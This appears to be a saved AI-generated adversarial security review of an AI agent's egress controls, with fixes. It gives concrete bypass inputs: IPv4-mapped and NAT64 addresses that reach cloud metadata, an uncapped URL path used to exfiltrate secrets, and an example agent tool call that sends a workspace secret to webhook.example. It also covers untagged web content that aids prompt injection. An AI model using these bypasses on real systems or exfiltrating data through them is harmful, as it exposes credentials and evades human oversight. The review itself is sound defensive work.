# Egress build code panel: x-ai/grok-4.5

_finish=stop seconds=221.4 cost=$0.1191 usage={'prompt_tokens': 26640, 'completion_tokens': 11005, 'total_tokens': 37645, 'cost': 0.1190924, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 128, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.1190924, 'upstream_inference_prompt_cost': 0.0530624, 'upstream_inference_completions_cost': 0.06603}, 'completion_tokens_details': {'reasoning_tokens': 8552, 'image_tokens': 0, 'audio_tokens': 0}}_

# Adversarial review — ADR 0003 Tier-1 egress (shipped)

## Findings

### F1 / IPv4-mapped IPv6 (and NAT64) bypass `is_safe_public_ip` → SSRF-to-metadata
**SEVERITY:** HIGH  
**LOCATION:** `collaborator/egress.py:148-158` (`is_safe_public_ip`); used at `egress.py:227-230`

**CONCRETE INPUT OR BYPASS:**
```python
is_safe_public_ip("::ffff:169.254.169.254")  # True  (BUG)
is_safe_public_ip("::ffff:127.0.0.1")         # True  (BUG)
is_safe_public_ip("::ffff:10.0.0.1")          # True  (BUG)
is_safe_public_ip("64:ff9b::a9fe:a9fe")       # True  (NAT64 → 169.254.169.254)
```
Attack: allowlisted name (subdomain takeover, attacker-controlled allowlisted host, or malicious AAAA) whose first `getaddrinfo` result is `::ffff:169.254.169.254`.  
`fetch("https://allowed.example/")` → capability `net.get:allowed.example` passes → resolver returns mapped AAAA → pin accepts → `socket.create_connection(("::ffff:169.254.169.254", 443))` hits link-local metadata.

**WHY IT BREAKS A GUARANTEE:** ADR / module contract: “Pin the IP; block private/loopback/link-local/metadata” and “closes DNS-rebind and SSRF-to-metadata.” Python’s `ipaddress` does **not** project `is_private` / `is_link_local` / `is_loopback` onto `ipv4_mapped` (or NAT64). The pin still pins — it pins a **dangerous** address.

**ANOTHER CHECK CATCHES IT?** No. Capability is name-based; redirects are not involved; TLS SNI is the allowlisted name (metadata hosts often ignore SNI). Research and `web_fetch` both call the same helper.

**FIX:** Before policy checks, unwrap then re-check:
```python
addr = ipaddress.ip_address(ip)
if getattr(addr, "ipv4_mapped", None) is not None:
    addr = addr.ipv4_mapped
# also reject NAT64 64:ff9b::/96 (and known well-known prefixes) explicitly
if addr.version == 6 and any(addr in net for net in NAT64_NETS):
    return False
return addr.is_global  # or the existing flag set on the *unwrapped* address
```
Add unit cases for `::ffff:169.254.169.254`, `::ffff:127.0.0.1`, `::ffff:10.0.0.1`, NAT64 forms.

---

### F2 / GET path is an uncapped exfil channel (query-only cap)
**SEVERITY:** MEDIUM  
**LOCATION:** `collaborator/egress.py:214-221`

**CONCRETE INPUT OR BYPASS:**
```text
https://allowlisted.example/exfil/<2k–N bytes of secrets read from workspace>
```
Query `d=…` longer than 512 is refused; **path length is not checked**. `request_bytes` is audited but not bounded for path. Research can emit this URL autonomously via `web_get` (see F3).

**WHY IT BREAKS A GUARANTEE:** Stated mediation contract treats GET as an exfil surface and claims bounds (“query-length cap”, “bounded”). Path is an equal outbound byte channel; only half the target is capped.

**ANOTHER CHECK CATCHES IT?** No capability/transport check limits path size. Response cap does not limit **outbound** path. Human preview may show a long URL on `web_fetch`, but default leash is `ACT_THEN_REPORT` (`tools.py:214-216`), so no approval required once `net.get:<host>` exists.

**FIX:** Cap `len(path) + len(query)` (e.g. same 512 or a single `MAX_REQUEST_TARGET`), refuse over-cap before connect; optionally hash is already present — keep it.

---

### F3 / `web_research` originates allowlisted GETs with no per-fetch gate / no `propose_first` floor
**SEVERITY:** MEDIUM  
**LOCATION:** `collaborator/research.py:154-175` (`_web_get_finding`); `run_research` → `propose_researched` `207-214`

**CONCRETE INPUT OR BYPASS:**
- Session: `research_trust="web_research"`, caps include `net.get:webhook.example`.
- Research model step:  
  `{"read":{"name":"web_get","arguments":{"url":"https://webhook.example/c?q=<secret from prior read_file finding>"}}}`
- `_web_get_finding` checks `granted_capabilities` and calls `egress.fetch` **inline** — no `govern_action`, no HELD decision, no human hand on that emission.

**WHY IT BREAKS A GUARANTEE:** ADR Decision explicitly: “Egress that feeds *unsurfaced* perception is floored to `propose_first` (or surfaced).” Implementation is autonomous perception egress. Combined with F2, this is **autonomous** exfil to any allowlisted host; combined with injection, untrusted bytes enter proposer context before any approval (`research.py:143-145` → propose path per ADR).

**ANOTHER CHECK CATCHES IT?** Default-deny allowlist still applies (same `required_capability` + `granted_capabilities`) — cannot hit non-allowlisted hosts. UNTRUSTED string tag does **not** structurally constrain the proposer. Downstream proposals may still be leashed, but the **GET already happened**.

**FIX:** Route research GETs through the same governed tool path (`web_fetch` / `govern_action`) with `propose_first`, or surface each research URL in the judgment view before `fetch`. Do not call `egress.fetch` from the research loop directly.

---

### F4 / `web_fetch` response body re-enters agent context without adversarial-provenance tag
**SEVERITY:** LOW  
**LOCATION:** `collaborator/tools.py:335-348` vs `research.py:150-175`

**CONCRETE INPUT OR BYPASS:** Grant `net.get:evil.example`, `govern_action(web_fetch, https://evil.example/)` with `ACT_THEN_REPORT` → `Execution.output` is raw body prefix (`result.text(2000)`) with only a status line — no `UNTRUSTED WEB CONTENT` fence. That string is normal tool output for the next model turn.

**WHY IT BREAKS A GUARANTEE:** Weaker than a gate bypass: ADR’s injection floor for web bytes is labeling + leash. Research labels; the primary Tier-1 tool does not. Tagging remains non-enforcing either way (ADR admits non-injection-resistance).

**ANOTHER CHECK CATCHES IT?** Capability gate still restricts *which* hosts; does not tag provenance.

**FIX:** Same provenance wrapper as `_UNTRUSTED_WEB` on `web_fetch` output (and any other consumer of `EgressResult.body`).

---

### F5 / `flag_offense_shape` is audit-only (confirm) — NON-FINDING as control bypass
**SEVERITY:** n/a (positive / non-finding)  
**LOCATION:** `tools.py:236-252`; set at `governance.py:320-331`, `401-411`; surfaced in `Decision.summary` only

**CONCRETE:** `run_command` + `nmap` → status `HELD` (propose_first floor), `offense_flag=="nmap"`, not `DENIED` (`test_collaborator_egress_gate.py` pins this).

**WHY:** Never branches on the flag to change status. Nothing in the new egress path treats it as a deny. User-influenced absence of a tag (renamed binary) only reduces audit signal — expected for audit-only.

**ANOTHER CHECK:** Structural default-deny + shell floor are the real controls (as ADR states).

---

## Non-findings (attack exercised, held)

| Attack | Result |
|--------|--------|
| Authorize-one / connect-another via userinfo (`https://allowed@evil/`, `https://docs…@evil/`) | `@` in `netloc` → `canonical_host` **None** → DENY; tests pin |
| Case / IDN / trailing-dot divergence | Single `canonical_host` for cap key, SNI, `Host`, resolve; connect IP pinned separately |
| Non-443 port / bare host / `http://` | Refused |
| Redirect follow (302 → metadata) | `http.client`; 3xx → `_refused`, not followed |
| Classic private A record rebind | `is_safe_public_ip` blocks normal `10/8`, `169.254.169.254`, `::1`, etc. |
| Capability mint/dodge via different canonicalization in gate vs fetch | Both use `egress.required_capability` → `canonical_host` |
| `required_capability` None fail-open | None → DENY in `govern_action` and `reauthorized_or_denied` |
| Approval emission TOCTOU (cap revoked) | Re-derives + re-checks current caps; test pins |
| Research to non-allowlisted host | `cap not in granted_capabilities` → refused |
| Model-supplied `Authorization` / `Cookie` | Not read from args; fixed header set only |
| IPv6 literals in URL | Rejected by `_HOST_CHARS` / idna |

`run_command` raw network reach is an **ADR-stated residual**, not a code contradiction.

---

## STEELMAN

The mediation core is real engineering, not theater: one canonical host string for capability key, SNI, and `Host`; redirects fail closed on `http.client`; resolve-once + pin; governance derives `net.get:<host>` and re-derives at approval; research default-deny uses the same capability strings. Tests pin the panel’s main authorize/connect, redirect, and TOCTOU cases. The design correctly treats offense-shape as audit-only and documents GET-as-exfil and same-channel logging limits.

---

## VERDICT

**SERIOUS_FLAWS** — Host authorization and redirect handling are sound, but incomplete IP safety (`is_safe_public_ip` on IPv4-mapped/NAT64) breaks the advertised SSRF/metadata guarantee whenever an allowlisted name can return those addresses.

**Single highest-value fix:** Unwrap `ipv4_mapped` (and reject NAT64/well-known translated prefixes) inside `is_safe_public_ip`, and lock it with explicit unit tests for `::ffff:169.254.169.254` / `::ffff:127.0.0.1` / `::ffff:10.0.0.1`.
